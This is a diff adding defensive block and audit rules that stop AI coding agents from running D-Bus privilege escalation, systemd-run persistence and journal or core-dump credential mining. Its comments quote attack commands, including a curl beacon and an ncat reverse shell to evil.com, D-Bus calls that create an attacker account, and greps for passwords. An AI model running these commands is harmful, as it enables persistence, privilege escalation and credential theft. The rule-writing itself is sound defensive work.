@@ -3679,3 +3679,264 @@ rules:
     decision: "BLOCK"
     confidence: 0.91
     reason: "clone(CLONE_NEWUSER) creates a new user namespace — the foundation for unprivileged namespace-based privilege escalation. Often followed by uid_map/gid_map writes. MITRE T1611."
+
+  # ===================================================================
+  # BLOCK: D-Bus privilege escalation via dbus-send / gdbus / busctl
+  # ===================================================================
+  #
+  # D-Bus is Linux's inter-process communication system with two buses:
+  #   - System bus (--system): connects to privileged services
+  #   - Session bus (--session): connects to user desktop services
+  #
+  # The system bus hosts services that can perform privileged operations
+  # WITHOUT requiring sudo:
+  #
+  #   org.freedesktop.systemd1      → Start/stop/create systemd services
+  #   org.freedesktop.PackageKit    → Install/remove packages
+  #   org.freedesktop.Accounts      → Create/delete user accounts
+  #   org.freedesktop.login1        → Reboot/shutdown/suspend
+  #   org.freedesktop.PolicyKit1    → Modify authorization policies
+  #   org.freedesktop.NetworkManager → Change network configuration
+  #   org.freedesktop.UDisks2       → Mount/unmount/format disks
+  #
+  # An AI coding agent compromised via prompt injection could invoke
+  # these services to install backdoor packages, create attacker
+  # accounts, start malicious services, or reboot the system — all
+  # without ever touching sudo, su, or pkexec.
+  #
+  # The three D-Bus CLI tools are:
+  #   dbus-send  — send a single message (most common)
+  #   gdbus      — GLib-based D-Bus tool (GNOME environments)
+  #   busctl     — systemd's D-Bus introspection/call tool
+  #
+  # Attack examples:
+  #   dbus-send --system --type=method_call \
+  #     --dest=org.freedesktop.systemd1 \
+  #     /org/freedesktop/systemd1 \
+  #     org.freedesktop.systemd1.Manager.StartUnit \
+  #     string:malware.service string:replace
+  #
+  #   busctl call org.freedesktop.Accounts \
+  #     /org/freedesktop/Accounts \
+  #     org.freedesktop.Accounts.CreateUser \
+  #     ssi attacker "" 1
+  #
+  #   gdbus call --system -d org.freedesktop.login1 \
+  #     -o /org/freedesktop/login1 \
+  #     -m org.freedesktop.login1.Manager.Reboot true
+
+  # --- BLOCK: D-Bus calls to systemd service manager ---
+  - id: "ts-block-dbus-systemd-manager"
+    taxonomy: "privilege-escalation/dbus-privilege-escalation/systemd-manager"
+    match:
+      command_regex: "(dbus-send|gdbus|busctl)\\s+.*(org\\.freedesktop\\.systemd1|systemd1\\.Manager)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "D-Bus call targeting systemd1 service manager — can start/stop/create systemd services without sudo. A prompt-injected agent could start a malicious service or disable security daemons. MITRE T1543.002."
+
+  # --- BLOCK: D-Bus calls to PackageKit (package installation) ---
+  - id: "ts-block-dbus-packagekit"
+    taxonomy: "privilege-escalation/dbus-privilege-escalation/packagekit-install"
+    match:
+      command_regex: "(dbus-send|gdbus|busctl)\\s+.*(org\\.freedesktop\\.PackageKit|PackageKit)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "D-Bus call targeting PackageKit — can install/remove packages without sudo via polkit authorization. An agent could install backdoored packages or remove security tools. MITRE T1059.004, T1195.002."
+
+  # --- BLOCK: D-Bus calls to Accounts service (user management) ---
+  - id: "ts-block-dbus-accounts"
+    taxonomy: "privilege-escalation/dbus-privilege-escalation/accounts-management"
+    match:
+      command_regex: "(dbus-send|gdbus|busctl)\\s+.*(org\\.freedesktop\\.Accounts|Accounts\\.CreateUser|Accounts\\.DeleteUser)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "D-Bus call targeting Accounts service — can create/delete user accounts without sudo. An agent could create a backdoor account or delete existing users. MITRE T1136.001."
+
+  # --- BLOCK: D-Bus calls to login1 (reboot/shutdown/suspend) ---
+  - id: "ts-block-dbus-login1"
+    taxonomy: "privilege-escalation/dbus-privilege-escalation/login1-power"
+    match:
+      command_regex: "(dbus-send|gdbus|busctl)\\s+.*(org\\.freedesktop\\.login1|login1\\.Manager\\.(Reboot|PowerOff|Suspend|Hibernate))"
+    decision: "BLOCK"
+    confidence: 0.94
+    reason: "D-Bus call targeting login1 power management — can reboot, shutdown, suspend, or hibernate the system without sudo. Causes denial of service or forces unsafe shutdown. MITRE T1529."
+
+  # --- BLOCK: D-Bus calls to PolicyKit (authorization policy) ---
+  - id: "ts-block-dbus-polkit"
+    taxonomy: "privilege-escalation/dbus-privilege-escalation/polkit-policy"
+    match:
+      command_regex: "(dbus-send|gdbus|busctl)\\s+.*(org\\.freedesktop\\.PolicyKit1|polkit1\\.Authority)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "D-Bus call targeting PolicyKit authorization service — can register/modify authorization policies, potentially granting unattended privilege escalation for future actions. MITRE T1548."
+
+  # --- BLOCK: D-Bus calls to UDisks2 (disk management) ---
+  - id: "ts-block-dbus-udisks"
+    taxonomy: "privilege-escalation/dbus-privilege-escalation/udisks-management"
+    match:
+      command_regex: "(dbus-send|gdbus|busctl)\\s+.*(org\\.freedesktop\\.UDisks2|UDisks2\\.(Block|Drive|Manager))"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "D-Bus call targeting UDisks2 disk management — can mount, unmount, format, or wipe disks without sudo. Destructive or exfiltration potential via removable media. MITRE T1561."
+
+  # --- AUDIT: Any D-Bus system bus call ---
+  - id: "ts-audit-dbus-system-bus"
+    taxonomy: "privilege-escalation/dbus-privilege-escalation/system-bus-generic"
+    match:
+      command_regex: "(dbus-send|gdbus|busctl)\\s+.*--system"
+    decision: "AUDIT"
+    confidence: 0.80
+    reason: "D-Bus system bus call — the system bus hosts privileged services. Any system bus interaction from an AI agent warrants logging. MITRE T1548."
+
+  # ===================================================================
+  # BLOCK: systemd-run transient timer/service persistence
+  # ===================================================================
+  #
+  # systemd-run creates transient (non-persistent) systemd units that
+  # execute commands on a schedule or as one-shot services. Unlike
+  # writing unit files to ~/.config/systemd/user/ (which we already
+  # detect), systemd-run creates units entirely in memory:
+  #
+  #   systemd-run --user --on-calendar="*:0/5" curl http://evil.com/beacon
+  #   systemd-run --user --unit=backdoor --remain-after-exit ncat -e /bin/sh evil.com 4444
+  #   systemd-run --user --on-boot=30 /tmp/payload.sh
+  #
+  # These transient units:
+  #   - Do NOT write any files to disk (bypass file-write detection)
+  #   - Survive until user logout (--user) or reboot (--system)
+  #   - Can use --on-calendar for cron-like scheduling
+  #   - Can use --remain-after-exit to keep services "active" after exit
+  #   - Can use --on-boot/--on-startup for delayed execution
+  #   - Are not visible in crontab -l
+  #
+  # The --system variant creates units running as root, which is even
+  # more dangerous as it provides persistent root-level execution.
+  #
+  # An AI agent has no legitimate need to create systemd timers or
+  # transient services.
+
+  # --- BLOCK: systemd-run with calendar scheduling ---
+  - id: "ts-block-systemd-run-calendar"
+    taxonomy: "persistence-evasion/transient-persistence/systemd-run-timer"
+    match:
+      command_regex: "systemd-run\\s+.*--on-(calendar|boot|startup|unit-active|unit-inactive)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "systemd-run with timer trigger — creates a transient scheduled task entirely in memory, bypassing all file-based persistence detection (crontab, systemd unit files). MITRE T1053.006."
+
+  # --- BLOCK: systemd-run with remain-after-exit (persistent service) ---
+  - id: "ts-block-systemd-run-persist"
+    taxonomy: "persistence-evasion/transient-persistence/systemd-run-persist"
+    match:
+      command_regex: "systemd-run\\s+.*--remain-after-exit"
+    decision: "BLOCK"
+    confidence: 0.94
+    reason: "systemd-run with --remain-after-exit — creates a transient service that stays 'active' after the process exits. Used to maintain presence without a daemon. MITRE T1543.002."
+
+  # --- BLOCK: systemd-run on system bus (root transient service) ---
+  - id: "ts-block-systemd-run-system"
+    taxonomy: "persistence-evasion/transient-persistence/systemd-run-root"
+    match:
+      command_regex: "systemd-run\\s+.*--system"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "systemd-run --system creates a transient unit running as root — provides root-level command execution without sudo appearing in command history. MITRE T1543.002."
+
+  # --- BLOCK: systemd-run with --unit flag (named transient unit) ---
+  - id: "ts-block-systemd-run-named"
+    taxonomy: "persistence-evasion/transient-persistence/systemd-run-named"
+    match:
+      command_regex: "systemd-run\\s+.*--unit[= ]"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "systemd-run with --unit — creates a named transient unit, which can be referenced by other services and is harder to identify as malicious in systemctl output. MITRE T1036.005."
+
+  # --- AUDIT: any systemd-run invocation ---
+  - id: "ts-audit-systemd-run"
+    taxonomy: "persistence-evasion/transient-persistence/systemd-run-generic"
+    match:
+      command_regex: "systemd-run\\s+"
+    decision: "AUDIT"
+    confidence: 0.80
+    reason: "systemd-run creates transient systemd units — any invocation from an AI agent is unusual and warrants logging, even without explicit persistence flags. MITRE T1053.006."
+
+  # ===================================================================
+  # BLOCK/AUDIT: journalctl / coredumpctl credential & log extraction
+  # ===================================================================
+  #
+  # systemd's journal aggregates logs from all services, including:
+  #   - sshd: failed login attempts (sometimes with cleartext passwords)
+  #   - sudo: all privilege escalation attempts with commands
+  #   - docker/podman: container operations, env vars in debug mode
+  #   - polkit: authorization decisions
+  #   - systemd itself: unit start/stop with full command lines
+  #
+  # An AI agent can mine these logs for credentials, API keys, and
+  # operational intelligence:
+  #
+  #   journalctl -u sshd --no-pager -o json | grep password
+  #   journalctl --user -o json-pretty   (user session secrets)
+  #   journalctl -b -o export            (full boot log in machine format)
+  #
+  # coredumpctl is even more dangerous — it retrieves core dumps from
+  # crashed processes, which contain the full memory image:
+  #
+  #   coredumpctl dump sshd -o /tmp/sshd.core
+  #   coredumpctl dump -o /tmp/dump && strings /tmp/dump | grep -i key
+  #
+  # Core dumps contain heap-allocated secrets, stack variables with
+  # passwords, and in-memory cryptographic keys.
+
+  # --- BLOCK: journalctl output piped to network commands ---
+  - id: "ts-block-journalctl-exfil"
+    taxonomy: "data-exfiltration/log-extraction/journalctl-network-exfil"
+    match:
+      command_regex: "journalctl\\s+.*\\|\\s*.*(curl|wget|nc|ncat|socat|ssh|scp|rsync|telnet|ftp)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "journalctl piped to network command — exfiltrating system logs which may contain credentials from failed logins, sudo commands, and service environment variables. MITRE T1005, T1048."
+
+  # --- BLOCK: journalctl grepping for secrets ---
+  - id: "ts-block-journalctl-credential-grep"
+    taxonomy: "data-exfiltration/log-extraction/journalctl-credential-mining"
+    match:
+      command_regex: "journalctl\\s+.*\\|\\s*.*(grep|awk|sed)\\s+.*(-i\\s+)?(password|passwd|secret|token|key|credential|api.?key|bearer|authorization)"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "journalctl filtered for credential patterns — actively mining system logs for passwords, tokens, or API keys from service logs and failed authentication attempts. MITRE T1552.003."
+
+  # --- BLOCK: journalctl for security-sensitive services in machine format ---
+  - id: "ts-block-journalctl-sensitive-json"
+    taxonomy: "data-exfiltration/log-extraction/journalctl-sensitive-export"
+    match:
+      command_regex: "journalctl\\s+.*-u\\s+(sshd|sudo|polkit|shadow|pam|docker|podman|vault|consul).*(-o|--output)\\s+(json|json-pretty|json-sse|export|cat)"
+    decision: "BLOCK"
+    confidence: 0.92
+    reason: "journalctl reading security-sensitive service logs in machine-parseable format — structured export of sshd/sudo/polkit logs enables automated credential extraction. MITRE T1552.003."
+
+  # --- BLOCK: coredumpctl dump (process memory extraction) ---
+  - id: "ts-block-coredumpctl-dump"
+    taxonomy: "data-exfiltration/log-extraction/coredumpctl-memory-dump"
+    match:
+      command_regex: "coredumpctl\\s+(dump|debug|gdb)"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "coredumpctl dump/debug — retrieves process core dumps containing full memory images with heap-allocated secrets, cryptographic keys, and in-flight credentials. MITRE T1003."
+
+  # --- AUDIT: journalctl with export/json output ---
+  - id: "ts-audit-journalctl-export"
+    taxonomy: "data-exfiltration/log-extraction/journalctl-export"
+    match:
+      command_regex: "journalctl\\s+.*(-o|--output)\\s+(json|json-pretty|json-sse|export)"
+    decision: "AUDIT"
+    confidence: 0.80
+    reason: "journalctl in machine-parseable output format — may be legitimate debugging but structured log export from an AI agent warrants logging. MITRE T1005."
+
+  # --- AUDIT: coredumpctl list (core dump enumeration) ---
+  - id: "ts-audit-coredumpctl-list"
+    taxonomy: "data-exfiltration/log-extraction/coredumpctl-enumerate"
+    match:
+      command_regex: "coredumpctl\\s+(list|info)"
+    decision: "AUDIT"
+    confidence: 0.78
+    reason: "coredumpctl list/info — enumerates available core dumps. Reconnaissance step before targeted dump extraction. MITRE T1083."
